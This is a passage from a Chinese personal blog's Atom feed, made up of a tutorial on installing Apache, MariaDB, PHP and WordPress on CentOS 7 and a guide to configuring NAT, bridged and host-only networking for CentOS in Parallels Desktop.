<strong>注：关闭SELINUX需要重启</strong></p></li></ul><ul><li><p>防火墙(iptables)</p></li><li><ul><li><p>注：CentOS 7.0 minimal版本默认使用firewalld，可考虑更改为iptables **</p><p> <a href="https://blog.csdn.net/yhblog/article/details/83931316" target="_blank" rel="noopener">参考：CentOS7（minimal版本）防火墙配置</a></p></li></ul></li></ul><ul><li><p>配置防火墙，开启80，3306端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/iptables</span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</span><br><span class="line">/etc/init.d/iptables restart</span><br></pre></td></tr></table></figure><p>  如图：<br>  <img src="iptables.jpg" alt="iptables"></p></li></ul><h2 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h2><p><strong>1. 具体步骤</strong><br><code>yum install httpd* -y</code><br>完成后，编辑httpd.conf文件(在/etc/httpd/conf/httpd.conf下)<br><code>vi /etc/httpd/conf/httpd.conf</code></p><p>找到 #ServerName <a href="http://www.example.com:80" target="_blank" rel="noopener">www.example.com:80</a> 修改为  ServerName localhost:80 ，或者设置为你自己的域名</p><p>启动 <code>/etc/init.d/httpd start</code> 这里我遇到一个问题 <code>-bash: /etc/init.d/httpd: No such file or directory</code>解决办法，先使用which查看httpd在哪: <code>which httpd</code> 发现在 <code>/usr/sbin/httpd</code> 目录下，故应该使用 <code>/usr/sbin/httpd start</code> 来启动，当然也可以直接使用 <code>systemctl start httpd.service</code>来启动</p><p><strong>2. apache设置开机启动</strong><br>启动服务：<code>systemctl start httpd</code><br>开机启动：<code>systemctl enable httpd</code></p><p><strong>3.查看服务状态</strong><br><code>systemctl status httpd</code><br>如图：<br><img src="httpd.jpg" alt="httpd成功状态"></p><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><p><strong>1. 具体步骤</strong><br><code>yum install mariadb mariadb-server mariadb-libs mariadb-devel</code></p><p><strong>2. 查看安装状态</strong><br><code>rpm -qa |grep maria</code></p><p><strong>3. 设置开机启动</strong><br>启动服务：<code>systemctl start  mariadb</code><br>开机启动：<code>systemctl enable  mariadb</code></p><p><strong>4. 数据库安全设置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">[root@nmserver-7 ~]# mysql_secure_installation </span><br><span class="line"></span><br><span class="line">NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB</span><br><span class="line">      SERVERS IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!</span><br><span class="line"></span><br><span class="line">In order to log into MariaDB to secure it, we&apos;ll need the current</span><br><span class="line">password for the root user.  If you&apos;ve just installed MariaDB, and</span><br><span class="line">you haven&apos;t set the root password yet, the password will be blank,</span><br><span class="line">so you should just press enter here.</span><br><span class="line"></span><br><span class="line">Enter current password for root (enter for none): </span><br><span class="line">OK, successfully used password, moving on...</span><br><span class="line"></span><br><span class="line">Setting the root password ensures that nobody can log into the MariaDB</span><br><span class="line">root user without the proper authorisation.</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n] y</span><br><span class="line">New password: </span><br><span class="line">Re-enter new password: </span><br><span class="line">Password updated successfully!</span><br><span class="line">Reloading privilege tables..</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">By default, a MariaDB installation has an anonymous user, allowing anyone</span><br><span class="line">to log into MariaDB without having to have a user account created for</span><br><span class="line">them.  This is intended only for testing, and to make the installation</span><br><span class="line">go a bit smoother.  You should remove them before moving into a</span><br><span class="line">production environment.</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n] y</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">Normally, root should only be allowed to connect from &apos;localhost&apos;.  This</span><br><span class="line">ensures that someone cannot guess at the root password from the network.</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n] n</span><br><span class="line"> ... skipping.</span><br><span class="line"></span><br><span class="line">By default, MariaDB comes with a database named &apos;test&apos; that anyone can</span><br><span class="line">access.  This is also intended only for testing, and should be removed</span><br><span class="line">before moving into a production environment.</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n] y</span><br><span class="line"> - Dropping test database...</span><br><span class="line"> ... Success!</span><br><span class="line"> - Removing privileges on test database...</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">Reloading the privilege tables will ensure that all changes made so far</span><br><span class="line">will take effect immediately.</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n] y</span><br><span class="line"> ... Success!</span><br><span class="line"></span><br><span class="line">Cleaning up...</span><br><span class="line"></span><br><span class="line">All done!  If you&apos;ve completed all of the above steps, your MariaDB</span><br><span class="line">installation should now be secure.</span><br><span class="line"></span><br><span class="line">Thanks for using MariaDB!</span><br></pre></td></tr></table></figure><p><strong>5. 查看状态</strong><br><code>systemctl status  mariadb</code><br>图片：<br><img src="mysql.jpg" alt="mysql"></p><p><strong>6. 出现的问题</strong></p><p>我在安装完mariaDB后，使用mysql 或者 mysql -uroot -p 或者mysqladmin -uroot password ‘newpassword’ 等都无法进入mysql，出现错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: NO)</span><br><span class="line">或者</span><br><span class="line">ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)</span><br></pre></td></tr></table></figure><p>为什么出现这种情况？</p><p>1.可能是旧版的没卸载干净，试试旧版的密码<br>2.另一种可选的解决方案：<a href="https://blog.csdn.net/geoffreychan/article/details/78076966" target="_blank" rel="noopener">Centos7 MariaDB root账户密码重置</a></p><h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p><strong>1. 具体步骤</strong><br><code>yum -y install php</code><br><strong>2. 关联php与mysql</strong><br><code>yum install php-mysql</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rpm -ql php-mysql</span><br><span class="line">/etc/php.d/mysql.ini</span><br><span class="line">/etc/php.d/mysqli.ini</span><br><span class="line">/etc/php.d/pdo_mysql.ini</span><br><span class="line">/usr/lib/php/modules/mysql.so</span><br><span class="line">/usr/lib/php/modules/mysqli.so</span><br><span class="line">/usr/lib/php/modules/pdo_mysql.so</span><br></pre></td></tr></table></figure><p><strong>3. 安装常用PHP模块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-snmp php-soap curl curl-devel php-bcmath</span><br></pre></td></tr></table></figure><p><strong>4. 测试</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cd /var/www/html</span><br><span class="line">$ ls</span><br><span class="line">$ pwd</span><br><span class="line">/var/www/html</span><br><span class="line">$ vi info.php</span><br><span class="line">&lt;?php</span><br><span class="line">        phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure><p>在浏览器打开: IP:PORT/info.php [此处IP是你虚拟机的IP或者localhost，端口若为默认的80，可不写]<br>看到如下则LAMP环境搭建完成：<br><img src="lamp.jpg" alt="lamp"></p><h1 id="0x03-开始安装WordPress"><a href="#0x03-开始安装WordPress" class="headerlink" title="0x03 开始安装WordPress"></a>0x03 开始安装WordPress</h1><h2 id="下载并安装WordPress"><a href="#下载并安装WordPress" class="headerlink" title="下载并安装WordPress"></a>下载并安装WordPress</h2><p><strong>1. 下载</strong><br>    我想把它下载到<code>/tmp</code>目录，因为这个目录时临时的，且我们一旦安装完WordPress，安装包就没用了<br>    执行如下命令：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget &quot;https://cn.wordpress.org/latest-zh_CN.tar.gz&quot;</span><br></pre></td></tr></table></figure></p><p><strong>2. 安装</strong><br>    a) 先解压至<code>/var/www/html</code>这个网页根目录<br>    <code>tar xvf latest-zh_CN.tar.gz -C /var/www/html</code><br>    b) 此时目录结构为<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">\</span><br><span class="line"> |index.html</span><br><span class="line"> |wordpress</span><br><span class="line">  \</span><br><span class="line"> wordpress网站的php文件</span><br></pre></td></tr></table></figure></p><p>c) 故需要将 /var/www/html/wordpress/ 下的所有文件都复制到 /var/www/html 下，并删除空的wordpress/文件<br><code>cp -r /var/www/html/wordpress/* /var/www/html/ &amp;&amp; rm -rf /var/www/html/wordpress</code></p><p><strong>3. 配置数据库</strong><br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u adminusername -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5340 to server version: 3.23.54</span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line">mysql&gt; CREATE DATABASE databasename;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON databasename.* TO &quot;wordpressusername&quot;@&quot;hostname&quot;</span><br><span class="line">   -&gt; IDENTIFIED BY &quot;password&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line">mysql&gt; EXIT</span><br><span class="line">Bye</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><p><strong>4. 初始化-配置wp-config.php文件</strong><br>    a) 将html/目录下的 <code>wp-config-sample.php</code> 重命名为 <code>wp-config.php</code><br>    <code>mv wp-config-sample.php wp-config.php</code><br>    b) 找到如下选项，并配置成刚才上面设置的数据库名和用户密码<br>    <img src="database.jpg" alt="database_options"><br>    如图所示：[乱码是正常的，忽视即可！]<br>    <img src="db_final.jpg" alt="db_final"></p><p><strong>5. 运行安装脚本</strong><br>    将WordPress文件放在根目录下的用户请访问：<a href="http://yourip:port/wp-admin/install.php" target="_blank" rel="noopener">http://yourip:port/wp-admin/install.php</a><br>    我虚拟机的IP是 10.211.55.13 故访问 <a href="http://10.211.55.13/wp-admin/install.php" target="_blank" rel="noopener">http://10.211.55.13/wp-admin/install.php</a><br>    填写基本信息：<br>    <img src="info.jpg" alt="info"><br>    点击<code>安装Wordpress</code><br>    <img src="login.jpg" alt="login"><br>    点击<code>登录</code>，进入后台<br>    <img src="admin.jpg" alt="admin"></p><p><strong>6. 完成效果</strong><br>    <img src="finish.jpg" alt="finish"></p><center> --------------------- 至此安装完成 ------------------------</center>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-查看是否存在残余的版本并卸载之&quot;&gt;&lt;a href=&quot;#0x01-查看是否存在残余的版本并卸载之&quot; class=&quot;headerlink&quot; title=&quot;0x01 查看是否存在残余的版本并卸载之&quot;&gt;&lt;/a&gt;0x01 查看是否存在残余的版本并卸载之&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CentOS 在 Parallels Desktops 中网络配置的三种模式</title>
    <link href="https://r0sev.github.io/2019/03/19/CentOS-%E5%9C%A8-Parallels-Desktops-%E4%B8%AD%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%89%E7%A7%8D%E6%A8%A1%E5%BC%8F/"/>
    <id>https://r0sev.github.io/2019/03/19/CentOS-在-Parallels-Desktops-中网络配置的三种模式/</id>
    <published>2019-03-19T14:25:07.000Z</published>
    <updated>2019-03-19T14:32:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="三种模式简介："><a href="#三种模式简介：" class="headerlink" title="三种模式简介："></a>三种模式简介：</h2><ol><li>NAT (Shared Network)</li><li>Host-Only Network</li><li>Bridged Network</li></ol><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><ul><li>操作系统：macOS Mojave </li><li>虚拟机：Parallels Desktop</li><li>软件版本：CentOS 7.0 minimal</li></ul><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="使用NAT模式"><a href="#使用NAT模式" class="headerlink" title="使用NAT模式"></a>使用NAT模式</h2><p>使用NAT模式时，可以选择使用某个虚拟网卡，<br>此时需要知道该网卡的网关，可在主机中使用<br>ifconfig命令查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig 得到虚拟网卡地址：</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">inet 10.211.55.2 netmask 0xffffff00 broadcast 10.211.55.255</span><br><span class="line">------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><img src="nat.jpg" alt="nat"></p><p>在Source选项中选择 Shared Network，如上图，<br>编辑 /etc/sysconfig/network-scripts/ifcfg-eth0 配置文件[一般格式 ifcfg-xxx]:</p><ul><li><p>自动分配IP：[这样配置不用管上面得到的网卡地址]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Generated by parse-kickstart</span><br><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">BOOTPROTO=&quot;dhcp&quot;</span><br><span class="line">UUID=&quot;afa8f527-af4c-4a93-bc1b-3ebc7f49816c&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure></li><li><p>使用静态IP：[必须按照虚拟网卡地址的网段配置]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Generated by parse-kickstart</span><br><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">IPADDR=&quot;10.211.55.100&quot;      &lt;------- 注意IP</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line">GATEWAY=&quot;10.211.55.1&quot;       &lt;------- 网关地址，部分软件使用xx.xx.xx.2作为网关地址</span><br><span class="line">UUID=&quot;afa8f527-af4c-4a93-bc1b-3ebc7f49816c&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure></li><li><p>配置完成后：重启网络并测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ service network restart</span><br><span class="line">$ ping baidu.com -c 4         ----&gt; 若成功，则实验完成</span><br></pre></td></tr></table></figure></li><li><p>若没有测试成功，检查虚拟机与主机的连接状态，酌情处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ping host_ip</span><br><span class="line">以及从主机ping虚拟机</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用桥接模式"><a href="#使用桥接模式" class="headerlink" title="使用桥接模式"></a>使用桥接模式</h2><p>使用桥接模式时：PD的设置如图(此时我需要桥接到wifi网卡上，因为我是连的wifi)</p><p><img src="bridge.jpg" alt="bridge"></p><p> 查看主机ip：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inet 192.168.199.133 netmask 0xffffff00 broadcast 192.168.199.255</span><br></pre></td></tr></table></figure></p><ul><li>使用静态IP：[必须上面主机ip属于同一网段]<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Generated by parse-kickstart</span><br><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">IPADDR=&quot;192.168.199.200&quot;        &lt;------- 注意IP</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line">GATEWAY=&quot;192.168.199.1&quot;         &lt;------- 网关地址，参考主机的网关地址</span><br><span class="line">UUID=&quot;afa8f527-af4c-4a93-bc1b-3ebc7f49816c&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure></li></ul><p>遇到问题：ping qq.com or ping baidu.com 不成功! <br>查看DNS解析:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf 发现为空</span><br><span class="line">在该配置文件中加入:</span><br><span class="line">nameserver 192.168.199.1        &lt;----- 这也是主机的dns服务器</span><br></pre></td></tr></table></figure><p>重启网络，测试成功</p><ul><li>自动分配IP：[超级省事，一配一个准]<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Generated by parse-kickstart</span><br><span class="line">DEVICE=&quot;eth0&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">BOOTPROTO=&quot;dhcp&quot;</span><br><span class="line">UUID=&quot;afa8f527-af4c-4a93-bc1b-3ebc7f49816c&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用仅主机模式"><a href="#使用仅主机模式" class="headerlink" title="使用仅主机模式"></a>使用仅主机模式</h2><p><img src="host-only.jpg" alt="host-only"></p><ul><li>略。用处不多。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;三种模式简介：&quot;&gt;&lt;a href=&quot;#三种模式简介：&quot; class=&quot;headerlink&quot; title=&quot;三种模式简介：&quot;&gt;&lt;/a&gt;三种模式简介：&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;NAT (Shared Network)&lt;/li&gt;
&lt;li&gt;Host-Only Netw
      
    
    </summary>
    
    
  </entry>
  
</feed>
